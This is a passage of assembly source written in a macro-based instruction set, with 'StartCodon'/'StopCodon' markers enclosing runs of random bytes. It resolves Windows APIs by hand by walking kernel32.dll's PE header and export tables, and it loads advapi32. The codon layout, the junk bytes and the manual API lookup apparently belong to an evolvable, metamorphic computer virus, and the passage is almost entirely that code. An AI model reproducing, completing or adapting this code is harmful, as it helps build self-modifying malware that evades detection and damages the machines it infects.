        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 140
db 143
db 28
db 121
db 203
db 209
db 252
db 55
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 153
db 77
db 111
db 173
db 55
db 80
db 168
db 10
db 135
db 253
db 198
db 41
db 55
db 39
db 137
db 248
db 91
db 193
db 0
db 190
db 231
db 84
db 99
db 70
db 247
db 124
db 248
db 86
db 182
db 176
db 198
db 189
db 242
db 72
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _nopdD
               _nopsB
    BigNum=0x1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _nopdB
db StopCodon
db 76
db 184
db 157
db 31
db 243
db 48
db 3
db 190
db 243
db 214
db 78
db 149
db 48
db 20
db 223
db 104
db 194
db 14
db 166
db 94
db 79
db 93
db 201
db 181
db 206
db 227
db 92
db 221
db 29
db 108
db 254
db 103
db 182
db 146
db 69
db 73
db 41
db StartCodon
               _save
    _getDO
db StopCodon
db 248
db 154
db 20
db 143
db 3
db 157
db 57
db 219
db 91
db 245
db 46
db 95
db StartCodon
    BigNum=APINumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 14
db 64
db 2
db 251
db 11
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 32
db 47
db 108
db 21
db 245
db 2
db 53
db 2
db 62
db 249
db 144
db 71
db 68
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
               _getdata
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
               _JnzUp           ; Jnz FindAllAPIsNext
           ; end FindAllAPIsNext
       _popall
       ; FoundAPI
; end FindAllAPIs in kernel32.dll
    _getDO
    BigNum=stDLLadvapi32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 126
db 254
db 100
db 98
db 170
db 239
db 223
db 76
db 132
db 16
db 173
db 3
db 153
db 255
db 203
db 73
db 78
db 56
db 113
db 80
db 171
db 82
db 76
db 101
db 30
db 234
db 13
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 64
db 133
db 193
db 137
db 5
db 148
db 91
db 32
db 127
db 154
db 35
db 154
db 233
db 239
db 25
db 62
db 41
db 97
db 110
db 87
db 148
db 171
db 70
db 100
db 177
db 184
db 73
db 150
db 153
db 228
db 122
db 156
db 3
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
       _CallAPILoadLibrary      ; invoke LoadLibrary, "kernel32.dll"
    _getDO
db StopCodon
db 37
db 68
db 9
db 72
db 241
db 154
db 230
db 75
db 190
db 150
db 210
db 236
db 143
db 147
db 44
db 200
db 194
db 29
db 31
db 217
db 189
db 122
db 105
db 181
db 248
db 133
db 69
db 34
db 176
db 98
db 187
db 228
db 208
db 49
db 37
db 147
db 3
db 78
db 254
db 21
db 122
db 179
db 58
db 172
db 21
db 38
db 166
db 186
db 243
db 99
db 38
db 219
db 204
db 119
db 36
db 130
db 36
db 159
db 169
db 239
db 35
db StartCodon
    BigNum=hDLLlibrary32-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 168
db 99
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 35
db 203
db 240
db 94
db 198
db 112
db 6
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
db StopCodon
db 26
db 1
db 46
db 28
db 1
db 141
db 140
db 7
db 8
db 230
db 162
db 220
db 21
db 28
db 191
db 87
db 84
db 246
db 229
db 69
db 135
db 62
db 25
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
db StopCodon
db 239
db 97
db 193
db 239
db 204
db 150
db 60
db 175
db 100
db 126
db 70
db 127
db 0
db 92
db 229
db 119
db 233
db 114
db 111
db 49
db 37
db 116
db 116
db 209
db 62
db 177
db 103
db 242
db 119
db 107
db 68
db 64
db 120
db 106
db 116
db 231
db StartCodon
       _writeDWord              ; mov dword[hDLLkernel32], eax
       _save                    ; Save kernel32.dll position
    BigNum=0x3C
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 86
db 173
db 40
db 79
db 209
db 45
db 150
db 32
db 236
db 115
db 41
db 241
db 44
db 155
db 15
db 75
db 130
db 21
db 34
db 190
db 10
db 168
db 128
db 0
db 91
db 102
db 112
db 252
db 133
db 27
db 148
db 199
db 128
db 231
db 2
db 79
db 176
db 75
db 55
db 23
db 78
db 5
db 249
db 225
db 143
db 24
db 127
db 138
db 92
db 188
db 106
db 228
db 214
db 68
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; mov RegB, dword[hDLLkernel32+0x3C]
                                   ; = Pointer to PE Header of kernel32.dll
       _addsaved                ; relative -> absolut
    BigNum=0x78
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; Export Tables
       _addsaved                ; relative -> absolut
    BigNum=0x1C
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA                   ; temporarily save Offset of Addresse Table in RegA
    _getDO
    BigNum=hAddressTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hAddressTable
db StopCodon
db 22
db 25
db 254
db 86
db 62
db 201
db StartCodon
       _nopsA                   ; restore RegA=Addresse Tables
       _getdata                 ; Pointer To Addresse Table
       _addsaved                ; relative -> absolut
       _writeDWord              ; mov dword[hAddressTable], (Pointer to Addresse Table)
    _getDO
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=hNamePointerTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hNamePointerTable
       _nopsA                   ; BC1=Addresse Table
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdA
       _getdata                 ; Pointer To Name Table
       _addsaved                ; relative -> absolut
       _writeDWord              ; mov dword[hNamePointerTable], (Pointer to Name Pointer Table)
db StopCodon
db 201
db 211
db 39
db 231
db 190
db 250
db 27
db 103
db 167
db 18
db 77
db 36
db 198
db 72
db 109
db 97
db 151
db 177
db 142
db 149
db 246
db 10
db 220
db 197
db 49
db 235
db 103
db 1
db 63
db 6
db 239
db 149
db 254
db 31
db 103
db 162
db 26
db 172
db 175
db 139
db 239
db 95
db 193
db 240
db 31
db 74
db 38
db 23
db 195
db 223
db 128
db 178
db 81
db 56
db 208
db 179
db 72
db 164
db 153
db 155
db 82
db 71
db 230
db StartCodon
    _getDO
    BigNum=hOrdinalTable-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
db StopCodon
db 109
db 198
db 246
db StartCodon
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 206
db 52
db 38
db 247
db 245
db 158
db 7
db 183
db 214
db 212
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff              ; WriteOffset=hOrdinalTable
       _nopsA
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 57
db 243
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata                 ; Ordinal Table
       _addsaved                ; relative -> absolut
       _writeDWord              ; mov dword[hOrdinalTable], (Pointer to Ordinal Table)
    _getDO
db StopCodon
db 212
db 81
db 200
db 95
db 141
db 79
db 230
db 217
db 121
db 23
db 75
db 35
db 59
db 169
db 42
db 115
db 43
db 108
db 24
db 252
db 22
db StartCodon
    BigNum=APINumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=APINumberAdvapi
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord              ; Save number of kernel32.dll APIs
    _getDO
    BigNum=hAddressePointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 8
db 229
db 185
db 134
db 94
db 167
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
    _getDO
    BigNum=APIAddressesReg-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 62
db 223
db 113
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 208
db 151
db 29
db 196
db 36
db 22
db 90
db 205
db 250
db 89
db 198
db 126
db 71
db 223
db 38
db 72
db 222
db 254
db 32
db 186
db 81
db 126
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord      ; Saves the AddressePointer
    _getDO
    BigNum=hMagicNumberPointer-DataOffset
    AlreadyStarted=0
